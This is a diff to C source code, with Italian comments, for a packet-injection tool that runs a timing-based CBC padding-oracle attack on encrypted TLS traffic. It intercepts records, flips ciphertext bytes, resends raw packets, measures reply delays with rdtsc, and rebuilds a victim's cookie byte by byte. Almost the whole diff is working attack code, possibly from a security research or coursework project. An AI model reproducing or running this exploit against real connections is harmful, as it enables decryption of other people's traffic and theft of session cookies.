@@ -27,6 +27,13 @@
 #include <pcap.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
 
+
+static inline uint64_t rdtsc() {
+  unsigned int lo, hi;
+  __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
+  return ((uint64_t)hi << 32) | lo;
+}
+
 void extract_mode();
 void extract_network_config();
 
@@ -429,29 +436,31 @@ void modify_packet(bool first_modification){
 
   //l'hardcoded del blocco va poi regolato in base alla dimensione dei dati (se 42 byte o se multiplo di 42 byte) 
 
+  int block_pos = (data_packet->data_len - 5 - 16) / 16;
+  block_pos -= 1;
   if(first_modification){
-
-    int block_pos = (data_packet->data_len - 5 - 16) / 16;
-    block_pos -= 1;
+    
     modify_last_bytes(data_packet, block_pos, val_penultimate_byte, val_last_byte);
+    /*
     if(val_last_byte == 0xFF){
       val_last_byte = 0x00;
       val_penultimate_byte = (val_penultimate_byte +1) % 0x100;
     }else{
       val_last_byte = (val_last_byte + 1) % 0x100;
-    }
+    } */
   }else{ //per entrare in questo ramo di codice devo mettere first attack a false
-    Byte original_c15 = data_packet->data[5 + ((4-1) * 16) + 15];
+    Byte original_c15 = data_packet->data[5 + (block_pos * 16) + 15];
     Byte known_plain = cookie[cookie_index-1];
     Byte expected_padding = 0x01;
 
-    data_packet->data[5 + ((4-1) * 16) + 15] = original_c15 ^ known_plain ^ expected_padding;
-    data_packet->data[5 + ((4-1) * 16 ) + 14] = single_byte; 
+    data_packet->data[5 + (block_pos * 16) + 15] = original_c15 ^ known_plain ^ expected_padding;
+    data_packet->data[5 + (block_pos * 16 ) + 14] = single_byte; 
+    /*
     if(single_byte == 0xFF){
       single_byte = 0x00;
     }else{
       single_byte = (single_byte + 1) % 0x100;
-    }
+    }*/
   }
 
   print_blocks(data_packet->data, data_packet->data_len);
@@ -520,7 +529,7 @@ unsigned short recalculate_checksum(){
 }
 
 //function to send the modified packet to the server
-void send_modified_packet(struct timespec *start){
+void send_modified_packet(uint64_t *start){
   int smp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   int hincl = 1;
   int mark = 1;
@@ -554,7 +563,8 @@ void send_modified_packet(struct timespec *start){
 
   //printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");
 
-  clock_gettime(CLOCK_MONOTONIC_RAW, start);
+  //clock_gettime(CLOCK_MONOTONIC_RAW, start);
+  *start = rdtsc();
   sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
   //printf("pacchetto mandato al server! \n");
@@ -565,26 +575,20 @@ void send_modified_packet(struct timespec *start){
 
 //thread function to perform attack
 void *do_attack_thread(void *arg){
-
-  struct timespec start;
-  char *server_interface = get_server_interface(ip_server, port_server);
-  bool first_attack = true;
+bool first_attack = true; // DEFINITIVO: Parte dalla Fase 1 (2 byte)
   int n_attemps = 0;
   struct first_attack_result *fa_result = calloc(1, sizeof(struct first_attack_result));
   struct attack_result *a_result = calloc(1, sizeof(struct attack_result));
   Byte expected_padding = 0x01; 
   bool allocated = false;
-  Data_packet *original_packet = NULL;  //mi serve per poi effettuare lo xor e ricostruire il valore in chiaro del byte che sto cercando di indovinare
+  Data_packet *original_packet = NULL;
 
   if(!fa_result || !a_result) {
     perror("Errore di allocazione memoria per le matrici!");
     exit(EXIT_FAILURE);
   }
 
-  //printf("server interface: %s", server_interface);
-
   while(1){
-    // In do_attack_thread:
     pthread_mutex_lock(&attack_thread_mutex);
     while(attack == false){
       pthread_cond_wait(&attack_thread_cond, &attack_thread_mutex);
@@ -593,147 +597,95 @@ void *do_attack_thread(void *arg){
 
     if(original_packet == NULL && !allocated){
       original_packet = (Data_packet *)calloc(1, sizeof(Data_packet));
-      if(original_packet == NULL){
-        perror("Error allocating memory for original_packet! \n");
-        exit(EXIT_FAILURE);
-      }
       allocate_packet(data_packet, original_packet);
       allocated = true;
     }
     
-    //printf("Secondo thread avviato\n");
-    /*
-    printf("------Packet------ \n");
-    print_application_data(data_packet->data, data_packet->data_len); */
+    int column = 0;
+    int row = 0;
+
+    if(first_attack){
+      column = (int)(n_attemps / 65536);
+      row = n_attemps % 65536; 
+      val_penultimate_byte = (Byte)((row >> 8) & 0xFF);
+      val_last_byte = (Byte)(row & 0xFF);
+    } else {
+      column = (int)(n_attemps / 256);
+      row = n_attemps % 256;
+      single_byte = (Byte)row;
+    }
 
     clone_packet(data_packet, original_packet);
-
-    //printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
-    //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
-    //print_data_blocks(data_packet->data, data_packet->data_len);
-    
-    //se si tratta di prima modifica, provare in coppia i 2 byte
-    //se si tratta di modifica successiva alla prima, impostare il valore dell'ultimo byte in modo tale da inettare 0x01 come padding e modificare il penultimo byte
-    //in modo da provare tutti i valori possibili 
     modify_packet(first_attack);
 
-    //printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");
-    //print_data_blocks(data_packet->data, data_packet->data_len);
-    //printf("Recalculate checksum! \n");
-
     data_packet->tcp_header->check = recalculate_checksum();
-
     data_packet->ip_header->check = recalculate_ip_checksum(data_packet->ip_header);
-
-    //printf("Checksum: %04x \n", checksum);
    
     flush_pcap_buffer(pcap_handle);
          
-    send_modified_packet(&start);
+    uint64_t start_cycles;
+    send_modified_packet(&start_cycles);
+    uint64_t stop_cycles = get_server_response_time(pcap_handle, start_cycles);
 
-    struct timespec stop = get_server_response_time(pcap_handle, start);;
-
-    if(stop.tv_sec == 0 && stop.tv_nsec == 0){
-      printf("Server didn't reply \n");
+    if(stop_cycles == 0){
       attack = false;
-      continue;
+      continue; // Salta n_attemps++. Al prossimo giro riproverà la stessa identica configurazione!
     }
 
+    long long delta = stop_cycles - start_cycles;
 
-    long long resp_nanosec = ((long long)stop.tv_sec * 1000000000LL) + stop.tv_nsec;
-    long long send_nanosec = ((long long)start.tv_sec * 1000000000LL) + start.tv_nsec;
-    long long delta = resp_nanosec - send_nanosec;
-
-    /*
-    long resp_microsec = (stop.tv_sec * 1000000) + (stop.tv_nsec / 1000);
-    printf("valore di resp_microsec: %lu \n", resp_microsec);
-    long send_microsec = (start.tv_sec * 1000000) + (start.tv_nsec / 1000);
-    printf("valore di send_microsec: %lu \n", send_microsec); 
-    long delta = resp_microsec - send_microsec;   */
-
-    printf("Reply delta time: %lu \n", delta);
-
-    //write the reply time inside the struct
-
-    //if n_attemps == L_SIZE * 256 * 256 && first_attack (in first attack) call analyze_double_bytes(struct first_attack *result) function
-      //then set n_attemps == 0 and first_attack = false
-    //n_attemps / 256 = L (column for meas matrix)
-    //n_attemps - 256 * L = byte (row for meas matrix)
-
-    int column, row;
-   
     if(first_attack){
-      column = (int)(n_attemps / (256 * 256));
-      row = n_attemps - (256 * 256 * column);
       fa_result->time_meas[row][column] = (int64_t)delta;
       n_attemps++;
 
-      if(n_attemps == (L_SIZE * 256 * 256)){
-        n_attemps = 0;
-        first_attack = false;
-
+      if(n_attemps == (L_SIZE * 65536)){
+        printf("\n[+] Fase 1 Conclusa! Calcolo i primi 2 byte...\n");
         int byte_guess = analyze_double_bytes(fa_result);
-        printf("sono dopo alla funzione analyze_double_byte! \n");
+        
         Byte guessed_penultimate = (byte_guess >> 8) & 0xFF;
         Byte guessed_last = (byte_guess & 0xFF);
-        printf("penultimate byte: 0x%02x last byte: 0x%02x\n", guessed_penultimate, guessed_last);
 
-        int block_pos = (data_packet->data_len - 5 - 16)/16;
-        block_pos -= 1;
-
+        int block_pos = (data_packet->data_len - 5 - 16)/16 - 1;
         int block_offset = 5 + (block_pos * 16); 
         
-        //original packet è sostanzialmente un clone del pacchetto data_packet prima della modifica, quindi contiene i byte originali del pacchetto
-        Byte *original_packet_data = original_packet->data;
-        Byte original_ciph_penultimate = original_packet_data[block_offset + 14]; 
-        Byte original_ciph_last = original_packet_data[block_offset + 15];
+        Byte original_c14 = original_packet->data[block_offset + 14]; 
+        Byte original_c15 = original_packet->data[block_offset + 15];
         
+        // Calcolo puro del Plaintext Reale
+        Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_c14;
+        Byte plain_last = expected_padding ^ guessed_last ^ original_c15;
 
-        printf("Valore del penultimo byte: 0x%02x", guessed_penultimate);
-        printf("Valore dell'ultimo byte: 0x%02x", guessed_last);
-        //Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_ciph_penultimate;
-        //Byte plain_last = expected_padding ^ guessed_last ^ original_ciph_last;
+        printf("Plaintext Penultimo calcolato: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
+        printf("Plaintext Ultimo calcolato:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
         
-        //printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
-        //printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
+        cookie[cookie_index] = plain_last;
+        cookie[cookie_index + 1] = plain_penultimate;
+        cookie_index += 2;
 
-        /*DEBUGGING
-          so che gli ultimi 2 byte del plaintext sono 0x38 (8) e 0x39 (9)
-          per ottenere 0x01 0x01 so che i byte che devo iniettare sono
-        */
-
-        /*
-        Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
-        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; */
-
-        Byte expected_last_byte = 0x39;
-        Byte expected_penultimate_byte = 0x38;
-
-        printf("I byte che l'analisi statistica deve scegliere sono: \n last_byte: 0x%02x \n penultimate_byte: 0x%02x \n ", expected_last_byte, expected_penultimate_byte);
-        
-        //stampare i valori delle mediane delle statistica
-        cookie[cookie_index] = guessed_last;
-        cookie[cookie_index +1] = guessed_penultimate;
-        cookie_index+=2;
-      }
-    }else if(first_attack == false){
-      column = (int)(n_attemps / 256); 
-      row = n_attemps - (column * 256);
-      a_result->time_meas[row][column] = delta;
-      n_attemps++;
-      if(n_attemps == (L_SIZE * 256)){
+        // Reset contatori e transizione automatica in Fase 2
         n_attemps = 0;
+        first_attack = false; 
+      }
+    }else{
+      a_result->time_meas[row][column] = (int64_t)delta;
+      n_attemps++;
 
+      if(n_attemps == (L_SIZE * 256)){
+        printf("\n[+] Fase 2 Conclusa! Calcolo il byte successivo...\n");
         int guessed_byte = analyze_single_byte(a_result);
-        printf("guessed byte: 0x%02x \n", guessed_byte);
 
-        int plain_byte = expected_padding ^ guessed_byte ^ original_packet->data[5 + ((4-1) * 16 ) + 14];
-        printf("Plaintext byte: 0x%02x (ASCII: %c)\n", plain_byte, plain_byte);
-        //aggiungere il byte in chiaro al cookie e tenerne traccia per la modifica successiva
+        int block_pos = (data_packet->data_len - 5 - 16)/16 - 1;
+        Byte original_c14 = original_packet->data[5 + (block_pos * 16) + 14];
+        
+        Byte plain_byte = expected_padding ^ guessed_byte ^ original_c14;
+        printf("Plaintext byte calcolato: 0x%02x (ASCII: %c)\n", plain_byte, plain_byte);
+
         cookie[cookie_index] = plain_byte;
         cookie_index++;
+
+        // Azzera n_attemps e attende il prossimo shift del client per craccare il byte successivo
+        n_attemps = 0; 
       }
-      
     }
 
     printf("STAMPA COOKIE \n");
